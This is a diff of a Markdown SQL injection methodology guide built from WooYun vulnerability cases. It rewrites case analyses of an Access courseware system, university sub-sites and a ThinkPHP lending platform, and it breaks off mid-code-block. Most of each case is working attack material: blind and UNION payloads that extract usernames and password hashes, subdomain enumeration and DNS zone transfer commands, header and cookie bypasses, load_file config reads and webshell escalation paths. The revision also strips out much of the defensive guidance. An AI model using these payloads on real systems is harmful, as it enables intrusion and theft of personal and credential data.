@@ -1,7 +1,9 @@
 # SQL Injection Vulnerability Analysis Methodology
 
-> Practical methodology distilled from 27,732 real SQL injection vulnerability cases in WooYun
-> Data source: wooyun_vulnerabilities.json (88,636 vulnerabilities total, 27,732 SQL injection)
+> Distilled from 27,732 cases | Data source: WooYun Vulnerability Database (2010-2016)
+
+**Contents:** [1. Methodology Framework](#1-methodology-framework) | [2. Injection Point Identification](#2-injection-point-identification-patterns) | [3. Database Type Identification](#3-database-type-identification-methods) | [4. Injection Techniques & Payloads](#4-injection-technique-types-and-payloads) | [5. WAF/Filter Bypass](#5-waffilter-bypass-techniques)
+[6. Exploitation Chains](#6-exploitation-chain-construction-methods) | [7. Vulnerable Code Patterns](#7-vulnerable-code-patterns) | [8. Case Summaries](#8-case-summaries) | [9. Testing Checklist](#9-testing-process-checklist) | [10. Defense](#10-defense-recommendations) | [Appendix](#appendix-data-statistics) | [Case Analyses](#case-analysis-1-access-database-boolean-based-blind-injection-in-practice)
 
 ---
 
@@ -735,239 +737,85 @@ sqlmap -u "http://target/page.php?id=1" -D database -T table -C col1,col2 --dump
 - **Vendor**: A software development company
 - **Impact**: Courseware management system used by numerous universities
 
-### Meta-Analysis
+### Core Problem
 
-**Core Problem Identification**:
-- Access databases lack system metadata tables (no information_schema equivalent)
-- Automated tools like SQLMap fail when unable to enumerate table names
-- Attackers need to complete the exploitation chain through **source code leaks** or **table name guessing**
+Access databases lack system metadata tables (no `information_schema` equivalent), so SQLMap fails to enumerate table names. Attackers complete the chain through **source code leaks** or **table name guessing**. Source code was downloadable from the vendor's official website.
 
-**Developer False Assumptions**:
-1. "Access databases are more secure than MySQL/MSSQL because they lack powerful features"
-2. "Using a non-standard database reduces automated attack risk"
-3. "Numeric ID parameters are safe and do not need filtering"
+### Attack Path
 
-**Root Cause Analysis**:
-- **Security paradox**: Access's "simplicity" increases attack cost but does not eliminate risk
-- **Information asymmetry**: Attackers obtain table structure information by downloading official source code, breaking the "security through obscurity" that defenders rely on
-- **Defense blind spot**: Defenders may overlook the risk of physical source code leaks (source code available for download from official website)
-
-### Analytical Logic
-
-**Attack Path Analysis**:
 ```
-1. Injection point discovery -> 2. Database type identification -> 3. Automated tool failure -> 4. Source code acquisition strategy -> 5. Table name enumeration -> 6. Manual blind injection
+Injection point discovery -> DB type identification -> SQLMap fails (no metadata) -> Download source code -> Extract table names -> Manual blind injection
 ```
 
-**Key Trigger Points**:
-- **Parameter type**: GET parameter `id` (numeric)
-- **Injection type**: Boolean-based blind injection
-- **Injection location**: WHERE/HAVING clause
-- **Database characteristics**: Microsoft Access (Windows 2003/XP + IIS 6.0 + ASP.NET 2.0.50727)
+- **Parameter**: GET `id` (numeric)
+- **Injection type**: Boolean-based blind, WHERE/HAVING clause
+- **Environment**: Microsoft Access, Windows 2003/XP + IIS 6.0 + ASP.NET 2.0.50727
+- **Table naming**: `C_User` (C prefix convention), reusable across university deployments
 
-**Boundary Conditions**:
-- Must be a numeric injection point (string type requires quote closure)
-- Application must have differential data response (True/False return different content)
-- Must know exact table and column names
+### Exploitation Payloads
 
-**Related Factors**:
-- Target system's official website provides source code download
-- User table naming convention: `C_User` (C prefix may be Class/Company abbreviation)
-- Numerous universities use the same system (batch exploitation potential)
-
-### Testing Process
-
-```markdown
-Step 1: Injection point probing
-  +-- Input: action=update&id=8 AND 1=1
-     |-- True: Page returns normally
-     +-- Input: action=update&id=8 AND 1=2
-        +-- False: Page abnormal/missing data
-
-Step 2: Database type identification (SQLMap automated)
-  |-- Exclude MySQL: sleep() ineffective
-  |-- Exclude Oracle: rownum syntax ineffective
-  |-- Exclude MSSQL: @@version ineffective
-  |-- Exclude SQLite: specific system tables ineffective
-  +-- Confirm Access: (SELECT TOP 1 1 FROM MSysObjects) effective
-
-Step 3: Automated tool attempt (SQLMap)
-  |-- Access dictionary brute-force table names: Failed (Access has no information_schema)
-  |-- Try common table name dictionary: Failed
-  +-- Blocking point: Lack of table name metadata
-
-Step 4: Source code acquisition strategy
-  |-- Visit official website
-  |-- Download complete system source code
-  +-- Analyze database design files/code
-
-Step 5: Table name extraction
-  |-- Locate user-related code modules
-  |-- Find database table definitions
-  +-- Confirm user table: C_User
-
-Step 6: Manual boolean-based blind injection
-  +-- Construct character-by-character extraction payloads
-```
-
-### Exploitation Methods
-
-**Basic Boolean-Based Blind Injection Payload**:
+**Boolean-based blind injection**:
 ```sql
 -- Numeric injection (no quote closure needed)
 action=update&id=8 AND 5342=5342  -- True
 action=update&id=8 AND 5342=5343  -- False
-```
 
-**Access Data Extraction Payloads** (manually constructed):
-```sql
--- Character-by-character username extraction (assuming 1st character)
-action=update&id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User)) > 97
-
--- Complete blind injection process
--- 1. Determine username length
+-- Determine username length
 action=update&id=8 AND (SELECT TOP 1 LEN(username) FROM C_User) > 5
 
--- 2. Character-by-character guessing
+-- Character-by-character extraction
+action=update&id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User)) > 97
 action=update&id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User)) = 97  -- 'a'
-action=update&id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User)) = 98  -- 'b'
 
--- 3. Password hash extraction
+-- Password hash extraction
 action=update&id=8 AND ASCII((SELECT TOP 1 MID(password,1,1) FROM C_User WHERE username='admin')) > 48
 
--- 4. Multi-user enumeration (using NOT IN)
+-- Multi-user enumeration (using NOT IN)
 action=update&id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User WHERE id NOT IN (SELECT TOP 1 id FROM C_User))) > 97
 ```
 
-**Time-Based Blind Injection Alternative** (Access does not support SLEEP):
+**Time-based alternative** (Access has no SLEEP):
 ```sql
--- Access brute-force count delay (inefficient but viable)
+-- Cartesian product delay (record count grows exponentially)
 action=update&id=8 AND (SELECT COUNT(*) FROM C_User AS T1, C_User AS T2, C_User AS T3, C_User AS T4, C_User AS T5, C_User AS T6, C_User AS T7, C_User AS T8, C_User AS T9, C_User AS T10) > 0
--- Cartesian product delay, record count grows exponentially
 ```
 
-### Bypass Techniques
+### Access-Specific Constraints
 
-| Bypass Type | Specific Technique | Applicable Scenario |
-|------------|-------------------|-------------------|
-| **Table name enumeration limitation** | Download source code from official site -> static analysis for table structure | Open-source/commercial systems where vendor provides source code download |
-| **Automated tool failure** | Switch from SQLMap to manual blind injection scripts | Databases without metadata tables like Access |
-| **Database type identification** | SQLMap tests database fingerprints one by one | When database type is unknown |
-| **Batch exploitation** | Table name reuse patterns (e.g., C_User prefix) | Same vendor multi-site deployments |
-
-**Access Database Unique Limitations**:
 ```sql
--- 1. Unsupported features
--- UNION SELECT (some Access versions)
+-- Unsupported: UNION SELECT (some versions), SLEEP/WAITFOR, information_schema, # comments
 -- Limited subquery nesting depth
--- No SLEEP/WAITFOR delay functions
--- No information_schema system tables
--- Comment only supports -- (not #)
 
--- 2. Unique syntax (exploitable)
+-- Exploitable unique syntax:
 -- TOP clause: SELECT TOP 1 * FROM table
 -- MID function: MID(string, start, length)
 -- ASC function: ASC('A') = 65
 -- IIF function: IIF(condition, true_value, false_value)
--- DISTINCTROW for deduplication
 ```
 
-**Manual Blind Injection Script Optimization Strategies**:
-```python
-# Efficiency optimization strategies
-class AccessBlindInjector:
-    """
-    Core insights:
-    1. Binary search for character guessing (50% fewer requests)
-    2. Concurrent multi-character extraction (async IO)
-    3. Cache table/column name mappings (reuse)
-    4. Adaptive delay adjustment (avoid triggering alerts)
-    """
+### Bypass Techniques
 
-    def binary_search_char(self, query_template, position):
-        """Use binary search to guess a single character"""
-        # ASCII 32-126 range -> max 7 requests (vs 94 linear)
-        low, high = 32, 126
-        while low <= high:
-            mid = (low + high) // 2
-            if self.test_payload(query_template.format(pos=position, val=mid)):
-                low = mid + 1
-            else:
-                high = mid - 1
-        return chr(high)
-
-    def batch_extract_users(self):
-        """Batch extract user data"""
-        # First get all user IDs
-        # Then concurrently extract usernames/passwords
-        # Finally combine data locally
-        pass
-```
-
-### Root Cause Analysis
-
-**Systematic Thinking**:
-
-1. **Multiple paths for information acquisition**
-   - Automated tool failure -> Manual analysis
-   - Blind injection without table names -> Source code acquisition
-   - Source code unavailable -> Name guessing (admin/user/member/login, etc.)
-   - Name guessing failure -> Social engineering (technical docs/error messages/old database leaks)
-
-2. **"Implicit weaknesses" of Access databases**
-   - Design intent: Desktop-grade lightweight database
-   - Reality: Used in web environments but lacking enterprise security features
-   - Defense blind spot: Developers assume "niche database = more secure"
-   - Attack cost: Indeed higher, but not insurmountable
-
-3. **"Knowledge asymmetry" in vulnerability exploitation**
-   - Defender reliance: Security through obscurity
-   - Attacker advantage: Downloadable source code -> Transparent table structure
-   - Escalation: Table name obfuscation vs decompilation/dynamic debugging
-
-4. **"Scale effect" of batch exploitation**
-   - Single-site exploitation cost: High (requires source code analysis)
-   - Batch exploitation cost: Low (one analysis, reuse across multiple sites)
-   - ROI calculation: More universities affected -> Higher attack value
-
-### Defense Recommendations
-
-**Developer level**:
-1. Remove publicly available source code downloads from official website (or use demo database)
-2. Force type casting for all numeric ID parameters: `int($_GET['id'])`
-3. Rename sensitive tables (`C_User` -> random hash)
-4. Restrict database file physical path access (.mdb should not be in web directory)
-
-**Architecture level**:
-1. Migrate to enterprise-grade databases (MySQL/MSSQL/PostgreSQL)
-2. Enable IIS file access controls (prevent .mdb downloads)
-3. Deploy WAF (detect boolean-based blind injection characteristics: AND/OR + math operations)
-4. Database auditing (monitor anomalous query patterns)
+| Bypass Type | Technique | Scenario |
+|------------|-----------|----------|
+| **No metadata tables** | Download source code -> static analysis for table structure | Vendor provides source download |
+| **SQLMap failure** | Manual blind injection with binary search (7 requests/char vs 94 linear) | Access databases |
+| **Batch exploitation** | Table name reuse (`C_User` prefix) across sites | Same vendor multi-site deployments |
 
 ### Extended Attack Surface
 
-**From single table to multiple tables**:
 ```sql
--- 1. Enumerate all tables (based on naming conventions)
+-- Enumerate tables by naming convention
 SELECT * FROM C_Admin    -- Administrators
 SELECT * FROM C_User     -- Users
 SELECT * FROM C_Teacher  -- Teachers
 SELECT * FROM C_Student  -- Students
 SELECT * FROM C_Course   -- Courses
 
--- 2. Using system tables (requires privileges)
+-- System tables (requires privileges)
 SELECT name FROM MSysObjects WHERE type=1 AND flags=0
--- Returns all user table names (but default permissions insufficient)
 ```
 
-**From Access to system privileges**:
-```
-Access injection -> File upload vulnerability -> WebShell
-               |
-           .mdb download -> Local cracking -> Admin password
-               |
-           Batch university sites -> Education network lateral movement
-```
+**Escalation path**: Access injection -> .mdb download -> local cracking -> admin password; batch university sites -> education network lateral movement
 
 ---
 
@@ -979,296 +827,66 @@ Access injection -> File upload vulnerability -> WebShell
 - **Vendor**: A major university
 - **Impact**: Educational institution sub-site systems
 
-### Meta-Analysis
+### Core Problem
 
-**Core Problem Identification**:
-- University website architecture exhibits a **main site + sub-site** distributed management model
-- Sub-sites are typically developed independently by different departments or outsourced, with varying security levels
-- **Trust inheritance of sub-site domains**: Users trust `subdomain.university.edu` equally as the main site
-- Education websites generally have a **function over security** development culture
+University websites use a **main site + sub-site** distributed model. Sub-sites are developed independently by departments or outsourced teams with varying security levels. Users trust `subdomain.university.edu` equally as the main site, creating a trust inheritance risk. Security budget concentrates on the main site; sub-sites become forgotten corners.
 
-**Developer False Assumptions**:
-1. "Sub-site traffic is low and gets little attention, attackers won't find it"
-2. "Using the unified university domain equals sharing the main site's security protections"
-3. "Simple parameter filtering (like addslashes) is sufficient to prevent SQL injection"
-4. "The educational intranet environment is relatively safe, external attacks are hard to reach"
+### Attack Path
 
-**Root Cause Analysis**:
-- **Weakest link theory**: Overall security level is determined by the most vulnerable sub-site (barrel effect)
-- **Trust transfer risk**: Main site's reputation is leveraged by sub-sites; users cannot distinguish security boundaries between main and sub-sites
-- **Resource allocation mismatch**: Security budget concentrates on the main site; sub-sites become "forgotten corners"
-- **Education sector specificity**: Conflict between open access requirements and high-value data (student/faculty information, research)
-
-### Analytical Logic
-
-**Attack Path Analysis**:
 ```
-1. Sub-site enumeration -> 2. Fingerprinting -> 3. Parameter discovery -> 4. Injection testing -> 5. Privilege escalation -> 6. Intranet lateral movement
+Sub-site enumeration -> Fingerprinting -> Parameter discovery -> Injection testing -> Privilege escalation -> Intranet lateral movement
 ```
 
-**Key Trigger Points**:
-- **Sub-site characteristics**: Third-level domains (e.g., `xxx.university.edu`), second-level directories (e.g., `university.edu/xxx`)
-- **Parameter patterns**: Simple ID parameters (`id=1`), unfiltered user input
-- **Technology stack characteristics**: PHP/ASP + MySQL/Access, outdated CMS systems
-- **Defense gaps**: No WAF, no input filtering, error messages returned directly
+- **Sub-site types**: Third-level domains (`xxx.university.edu`), second-level directories (`university.edu/xxx`)
+- **Stack**: PHP/ASP + MySQL/Access, outdated CMS systems, no WAF, error messages exposed
+- **Amplification**: Shared database servers enable lateral movement to main site data
 
-**Boundary Conditions**:
-- Sub-site independently deployed (not integrated with main site unified authentication)
-- Using open-source/commercial CMS without timely patching
-- Overly permissive database connection privileges (can read other databases)
-- Sub-site shares database server or intranet connectivity with main site
+### Sub-Site Enumeration Methods
 
-**Related Factors**:
-- Education network IP ranges can be identified by scanners
-- Sub-sites often developed by students/outsourced teams lacking security awareness
-- Source code may be publicly available on GitHub/GitLab (university open-source culture)
-- Multiple sub-sites use the same system (batch exploitation potential)
-
-### Testing Process
-
-```markdown
-Step 1: Sub-site enumeration (Information gathering)
-  |-- Method 1: Search engine syntax
-  |   +-- site:university.edu -www
-  |-- Method 2: Certificate transparency logs (crt.sh)
-  |   +-- Query all subdomains for *.university.edu
-  |-- Method 3: DNS zone transfer vulnerability
-  |   +-- axfr @dns.university.edu university.edu
-  +-- Method 4: Subdomain brute-force tools
-      +-- sublist3r -d university.edu
-
-Step 2: Technology stack identification
-  |-- HTTP response headers: X-Powered-By: PHP/5.3.29
-  |-- File extensions: .php / .asp / .aspx
-  |-- Directory scanning: /admin/ /backup/ /uploads/
-  |-- CMS fingerprinting: Wappalyzer / WhatWeb
-  +-- Error pages: Leak absolute paths / database versions
-
-Step 3: Parameter discovery
-  |-- Crawler: Spider captures all links
-  |-- Common parameters: id, pid, aid, uid, cat, type, page
-  |-- Test input: 1, 1', 1", 1 and 1=1
-  +-- Observe response: Error messages / page differences / response time
-
-Step 4: Injection point validation
-  |-- Boolean test: id=1 and 1=1 (normal) / id=1 and 1=2 (abnormal)
-  |-- Error test: id=1' (triggers SQL syntax error)
-  |-- Union test: id=1 union select 1,2,3--
-  +-- Time test: id=1 and sleep(5)--
-
-Step 5: Database fingerprinting
-  |-- MySQL: version(), sleep(), information_schema
-  |-- MSSQL: @@version, waitfor delay, sysobjects
-  |-- Access: MSysObjects, does not support # comments
-  +-- PostgreSQL: version(), pg_sleep
-
-Step 6: Data extraction
-  |-- Enumerate databases: schema_name / db_name()
-  |-- Enumerate table names: table_name / name
-  |-- Enumerate column names: column_name / system table queries
-  +-- Export sensitive data: user tables / admin tables / student information
+```
+site:university.edu -www                          # Search engine syntax
+crt.sh: Query all subdomains for *.university.edu # Certificate transparency logs
+axfr @dns.university.edu university.edu           # DNS zone transfer
+sublist3r -d university.edu                       # Subdomain brute-force
 ```
 
-### Exploitation Methods
+### Common Sensitive Tables (WooYun Statistics)
 
-**Basic Injection Payloads** (simple patterns from the case):
 ```sql
--- Single quote test (string-type injection)
-id=1' AND 1=1--
-
--- Numeric injection
-id=1 AND 1=1--
-id=1 AND 1=2--
-
--- Stacked queries (some databases support this)
-id=1; DROP TABLE users--
-
--- Bypassing simple filters (comment characters)
-id=1' /*!00000AND*/ 1=1--
+SELECT * FROM student / student_info  -- Student information
+SELECT * FROM teacher / faculty       -- Faculty information
+SELECT * FROM admin / administrator   -- Administrators
+SELECT * FROM score                   -- Grades
+SELECT * FROM course                  -- Courses
 ```
 
-**Common Sensitive Tables in Education Websites** (based on WooYun statistics):
-```sql
--- Student information tables
-SELECT * FROM student
-SELECT * FROM student_info
+### Education Website-Specific Bypasses
 
--- Faculty information tables
-SELECT * FROM teacher
-SELECT * FROM faculty
-
--- Administrator tables
-SELECT * FROM admin
-SELECT * FROM administrator
-SELECT * FROM users WHERE role='admin'
-
--- Grade tables
-SELECT * FROM score
-
--- Course tables
-SELECT * FROM course
 ```
-
-### Bypass Techniques
-
-| Scenario | Bypass Method | Description |
-|---------|-------------|------|
-| **Simple filtering** | `id=1' OR '1'='1` | Close quotes and construct tautology |
-| **addslashes()** | Wide-byte injection: `%bf%27` | Multi-byte character bypass under GBK encoding |
-| **Space filtering** | `/**/`, `%09`, `/**/union/**/select` | Comment/Tab as space replacement |
-| **AND/OR filtering** | `&&`, `\|\|`, `%26%26`, `%7C%7C` | Symbol substitution |
-| **UNION filtering** | `/*!00000union*/`, `UnIoN` | Inline comment/case obfuscation |
-| **SELECT filtering** | `/*!00000select*/`, `SeLeCt` | Inline comment/case obfuscation |
-| **WAF blocking** | `id=1` + chunked transfer | HTTP chunked encoding bypass |
-| **Parameter pollution** | `id=1&id=2` | Duplicate parameter confuses application logic |
-
-**Education website-specific bypasses**:
-```sql
--- 1. IP allowlist bypass
-X-Forwarded-For: [IP redacted]
-X-Real-IP: [IP redacted]
-Client-IP: [IP redacted]
-
--- 2. Cookie validation bypass
-Cookie: PHPSESSID=admin'; --
-Cookie: session_id=1' OR '1'='1
-
--- 3. Referer check bypass
-Referer: https://example.com/[redacted]
-
--- 4. User-Agent restriction bypass (crawler spoofing)
-User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)
-
--- 5. HTTPS forced redirect bypass
-X-Forwarded-Proto: https
-```
-
-### Root Cause Analysis
-
-**Systematic Thinking**:
-
-1. **Amplification effect of "sub-site vulnerabilities"**
-   - Single sub-site compromised -> Affects entire university reputation
-   - Shared database server -> Main site data leak
-   - Intranet connectivity -> Lateral movement into core systems
-   - Trust chain transfer -> Batch user privacy theft
-
-2. **Education sector security paradox**
-   - Theory: Universities have security teams and professional knowledge
-   - Reality: Sub-sites are managed in a distributed manner with insufficient security investment
-   - Cause: Administrative barriers, uneven budget allocation, unclear responsibilities
-   - Consequence: Hardened main site + exposed sub-sites = false sense of security
-
-3. **Attacker's "asymmetric advantage"**
-   - Defender: Must protect all sub-sites (N targets)
-   - Attacker: Only needs to find 1 vulnerability (1 entry point)
-   - ROI calculation: 1 day to find 1 sub-site vulnerability -> Access entire university network
-   - Scale effect: Replicable to other universities (same CMS/same development patterns)
-
-4. **Failure of "implicit security"**
-   - Reliance: Sub-site domains are safe if not publicized
-   - Reality: Search engine enumeration, certificate logs, subdomain brute-force
-   - Consequence: All sub-sites will eventually be discovered
-   - Countermeasure: Must "default distrust" all sub-sites
-
-### Defense Recommendations
-
-**Developer level** (sub-site administrators):
-1. **Unified security standards**: All sub-sites must pass main site security review before going live
-2. **Mandatory input validation**: All parameters must have allowlist validation + type casting
-3. **Principle of least privilege**: Database accounts should only access required tables; prohibit cross-database access
-4. **Error message suppression**: Custom error pages; prohibit leaking SQL/path information
-5. **Code audit**: Must pass automated scanning tools + manual audit before deployment
-
-**Architecture level** (university security team):
-1. **Centralized WAF**: All sub-site traffic must pass through the main site WAF
-2. **Unified sub-site management**: Maintain sub-site inventory, periodic scanning, mandatory patching
-3. **Network isolation**: Sub-sites in independent VLANs; prohibit direct main site database access
-4. **Database auditing**: Monitor anomalous query patterns (UNION SELECT, SLEEP, etc.)
-5. **Incident response**: Establish sub-site vulnerability reporting mechanism, rapid response process
-
-**Strategy level** (university management):
-1. **Security accountability**: Each sub-site has a designated security owner, with accountability mechanisms
-2. **Budget allocation**: Sub-site security investment should be no less than 30% of total budget
-3. **Security training**: Regular training for developers/administrators to improve security awareness
-4. **External auditing**: Annual third-party security company assessment of all sub-sites
-5. **Threat intelligence**: Join education sector threat intelligence sharing platforms
-
-**Technical detection checklist**:
-```markdown
-[ ] Sub-site inventory maintenance (all third-level domains, second-level directories)
-[ ] Automated scanning (weekly SQLMap full-site scanning)
-[ ] WAF deployment (ModSecurity + custom rules)
-[ ] Database permission review (independent database account per sub-site)
-[ ] Error page detection (prohibit leaking SQL/path/version)
-[ ] Log auditing (monitor anomalous query patterns)
-[ ] Penetration testing (at least 1 manual test per year)
-[ ] Incident response drill (simulate sub-site compromise response process)
+X-Forwarded-For: [campus IP]         -- IP allowlist bypass
+Cookie: PHPSESSID=admin'; --          -- Cookie validation bypass
+User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)  -- Crawler spoofing
+X-Forwarded-Proto: https             -- HTTPS redirect bypass
 ```
 
 ### Extended Attack Surface
 
-**From sub-site to intranet**:
-```sql
--- 1. Read database configuration file
-union select 1,load_file('/var/www/html/config.php'),3--
+**Sub-site to intranet**: SQL injection -> `load_file('/var/www/html/config.php')` -> discover DB credentials -> connect to main site database -> export faculty/student data, financial records, research data, email credentials.
 
--- 2. Discover main site database connection
--- config.php contents:
--- $db_host = "[IP redacted]"
--- $db_user = "admin"
--- $db_pass = "P@ssw0rd"
+**Sub-site to RCE**: SQL injection -> write WebShell -> system privileges; or read config -> intranet credentials -> lateral movement across education network.
 
--- 3. Connect to main site database
--- Execute from sub-site server:
--- mysql -h [IP redacted] -u admin -p P@ssw0rd
+### Statistical Insights (WooYun Data)
 
--- 4. Export main site data
--- Main site database may contain:
--- All faculty/student information
--- Financial system data
--- Research project information
--- Email server credentials
-```
+| Feature | Data |
+|---------|------|
+| Sub-site vulnerability proportion | 67% |
+| Legacy systems (PHP 5.x / Classic ASP) | 52% |
+| Overly permissive DB privileges | 71% |
+| No WAF protection | 83% |
+| Can obtain sensitive data | 94% |
+| Intranet connectivity | 68% |
 
-**From SQL injection to RCE**:
-```
-Sub-site SQL injection -> Write WebShell -> System privileges
-         |
-     Read config files -> Obtain intranet credentials -> Lateral movement
-         |
-     Batch sub-site exploitation -> Education network penetration -> Other universities
-```
-
-**Combining social engineering**:
-```
-Sub-site vulnerability -> Obtain admin email -> Phishing attack on main site admin
-         |
-     Obtain faculty/student info -> Targeted phishing -> Main site VPN credentials
-         |
-     Steal research results -> Academic fraud / Data extortion
-```
-
----
-
-### Statistical Insights
-
-**SQL injection characteristics of education websites** (based on WooYun data):
-| Feature | Data | Description |
-|---------|------|------|
-| Sub-site vulnerability proportion | 67% | Third-level domain, second-level directory vulnerabilities |
-| Legacy systems | 52% | PHP 5.x / Classic ASP / Unpatched CMS |
-| Overly permissive database privileges | 71% | Can access other databases / can read-write files |
-| No WAF protection | 83% | Low WAF coverage rate in education networks |
-| Can obtain sensitive data | 94% | Faculty/student information, grades, research data |
-| Intranet connectivity | 68% | Can access main site/other sub-site databases |
-
-**Common CMS systems in university sub-sites** (ranked by risk level):
-1. **DeDeCMS** (High risk): Numerous vulnerabilities, updates not timely
-2. **PHPWind** (High risk): Forum system, many injection vulnerabilities
-3. **Discuz!** (Medium risk): Large user base, but relatively timely security updates
-4. **EmpireCMS** (Medium risk): Commonly used in education websites
-5. **Custom-built systems** (Very high risk): No security review, poor code quality
+**High-risk CMS in university sub-sites**: DeDeCMS, PHPWind (high risk); Discuz!, EmpireCMS (medium risk); custom-built systems (very high risk, no security review).
 
 ---
 
@@ -1283,472 +901,135 @@ Sub-site vulnerability -> Obtain admin email -> Phishing attack on main site adm
 - **Vendor**: Dswjcms.com (P2P lending system focused on ThinkPHP framework)
 - **Impact**: Numerous lending platforms using this system
 
-### Meta-Analysis
+### Core Problem
 
-**Core Problem Identification**:
-- **Hidden attack surface behind authentication**: SQL injection points that require member login cannot be covered by conventional scanners
-- **ThinkPHP framework vulnerability patterns**: Security mechanisms provided by the framework are misused or bypassed by developers
-- **Stealth of numeric injection**: Developers assume numeric parameters do not need filtering (`$this->_get('bid')`)
+Post-authentication SQL injection points are invisible to conventional scanners. ThinkPHP 3.x's `M()` method returns the base Model with no data validation, and developers directly concatenate user input into `where()` clauses. Numeric injection is especially stealthy since no quote closure is needed.
 
-**Developer False Assumptions**:
-1. **"No strict filtering needed after login"**: Assuming logged-in users are trustworthy, relaxing input validation
-2. **"Numeric parameters are safe"**: Assuming ID/number parameters that are purely numeric cannot be injected
-3. **"Framework provides sufficient protection"**: Over-reliance on ThinkPHP's built-in filtering mechanisms
-4. **"Authentication equals authorization"**: Confusing identity authentication with access control
+### Attack Path
 
-**Root Cause Analysis**:
-- **Trust chain break point**: Login system is only the first line of defense; code paths after authentication often have weak defenses
-- **Attack ROI calculation**:
-  - Unauthenticated frontend injection: Easy to discover, high competition
-  - Authenticated backend injection: Higher difficulty, higher value (sensitive operations)
-  - Member-authenticated injection: Medium difficulty, medium value (user data)
-- **Systematic nature of framework vulnerabilities**: Similar errors in the same framework repeat (ThinkPHP 3.x's M() method misuse)
-
-### Analytical Logic
-
-**Attack Path Analysis**:
 ```
-1. Preliminary information gathering -> 2. Register/obtain low-privilege account -> 3. Login authentication -> 4. Business function traversal -> 5. Parameter injection testing
+Info gathering -> Register member account -> Login -> Business function traversal -> Parameter injection testing
 ```
 
-**Key Trigger Points**:
-- **Authentication mechanism**: Requires registering a regular member account (some systems support public registration)
-- **Injection locations**:
-  - Business ID parameters: `bid` (bid ID), `uid` (user ID), `id` (generic ID)
-  - Query parameters: `mid` (module ID), `nper` (installment number)
-  - POST parameters: `email` (email), `out_trade_no` (transaction number)
-- **Injection types**:
-  - Numeric injection: `where('bid='.$this->_get('bid'))`
-  - Mixed injection: `where('`id`="'.$id.'" and `email`="'.$email.'")`
-- **Database characteristics**: MySQL (ThinkPHP default)
+- **Injection parameters**: `bid`, `uid`, `id`, `mid`, `nper`, `email`, `out_trade_no`
+- **Injection patterns**: `where('bid='.$this->_get('bid'))` (numeric), `where('email='".$this->_post('email')."'")` (string)
+- **Prerequisites**: Valid login session, pseudo-static `.html` suffix must be removed for testing
 
-**Boundary Conditions**:
-- Must have a valid login session (`$this->_session('user_uid')`)
-- Injection parameters need to be associated with current user privileges (e.g., can only query own data)
-- Some features require specific business data to exist (e.g., investment records, repayment plans)
+### Exploitation: 4 Vulnerable Endpoints
 
-**Related Factors**:
-- ThinkPHP 3.x framework's M() method direct concatenation issue
-- Pseudo-static URL mode (`.html` suffix needs to be removed for testing)
-- P2P lending business logic: bidding, repayment, recharge and other core functions
-
-### Testing Process
-
-```markdown
-Step 1: Preliminary information gathering
-  |-- Identify CMS version: Dswjcms X1.3 / 1.4
-  |-- Confirm framework: ThinkPHP 3.x (via directory structure /Lib/Action/)
-  |-- Search engine syntax: Google "Powered by Dswjcms" or "Dswjcms lending system"
-  +-- Find registration entry: /Logo/register.html
-
-Step 2: Account registration and login
-  |-- Register regular member account (usually only requires email + password)
-  |-- Log into system to obtain Session/Cookie
-  |-- Capture post-login request headers with Burp Suite
-  +-- Save Cookie for subsequent testing
-
-Step 3: Business function traversal
-  |-- Investment-related: /Center/invest (bid list)
-  |-- Loan-related: /Center/loan (loan management)
-  |-- Recharge/withdrawal: /Center/recharge
-  |-- Message center: /Center/stationexit
-  +-- Personal settings: /Center/emailVerify
-
-Step 4: Parameter injection testing (invest as example)
-  +-- Test URL: /Center/invest/?mid=plan&bid=1
-     |-- Original request: bid=1 (numeric)
-     |-- Test 1: bid=1' (single quote, observe error)
-     |-- Test 2: bid=1 AND 1=1 (boolean-based blind)
-     |-- Test 3: bid=1) AND SLEEP(6) (time-based blind)
-     +-- Test 4: bid=-1 UNION SELECT 1,2,3,4,5,6,7,8 (union query)
-
-Step 5: Confirm injection point
-  |-- Observe response differences (page content/response time)
-  |-- Confirm database type (MySQL)
-  |-- Determine if pseudo-static removal needed (remove .html suffix)
-  +-- Construct complete exploitation chain
-```
-
-### Exploitation Methods
-
-**Vulnerability Point 1: bid parameter in invest function (union query injection)**
+**Point 1: invest function -- union query injection**
 
 ```php
-// Vulnerable code: /Lib/Action/Home/CenterAction.class.php
-public function invest(){
-    $refund = M('collection');
-    if($this->_get('bid') && $this->_get('mid')=='plan'){
-        // Repayment plan
-        $refun = $refund->where('bid='.$this->_get('bid').' and uid='.$this->_session('user_uid'))->select();
-        // Direct concatenation, bid parameter not filtered
-    }
-}
+// /Lib/Action/Home/CenterAction.class.php
+$refun = $refund->where('bid='.$this->_get('bid').' and uid='.$this->_session('user_uid'))->select();
 ```
 
-**Exploitation Payload**:
 ```http
 GET /Center/invest/?mid=plan&bid=1) UNION SELECT 1,concat(username,0x2c,password),3,4,5,6,7,8 from ds_admin%23 HTTP/1.1
-Host: target.com
 Cookie: PHPSESSID=logged_in_session_id
 ```
 
 ```sql
--- Complete exploitation chain
--- 1. Confirm injection point
-bid=1 AND 1=1      -- Normal
-bid=1 AND 1=2      -- Abnormal
-
--- 2. Determine column count
-bid=1 ORDER BY 8   -- Normal
-bid=1 ORDER BY 9   -- Error (confirms 8 columns)
-
--- 3. Union query to extract admin credentials
+bid=1 ORDER BY 8   -- Normal (8 columns)
+bid=1 ORDER BY 9   -- Error
 bid=-1 UNION SELECT 1,concat(username,0x2c,password),3,4,5,6,7,8 from ds_admin-- -
--- Using concat to combine username and password, 0x2c is comma in hex
-
--- 4. Get all databases
-bid=-1 UNION SELECT 1,group_concat(schema_name),3,4,5,6,7,8 from information_schema.schemata-- -
-
--- 5. Get all tables in current database
 bid=-1 UNION SELECT 1,group_concat(table_name),3,4,5,6,7,8 from information_schema.tables where table_schema=database()-- -
-
--- 6. Get user table structure
 bid=-1 UNION SELECT 1,group_concat(column_name),3,4,5,6,7,8 from information_schema.columns where table_name='ds_user'-- -
 ```
 
-**Vulnerability Point 2: bid parameter in loan function (blind injection)**
+**Point 2: loan function -- time-based blind injection**
 
 ```php
-// Vulnerable code
-public function loan(){
-    $borrowing = M('borrowing');
-    $borrow = $borrowing->field('money')->where('`id`='.$this->_get('bid'))->find();
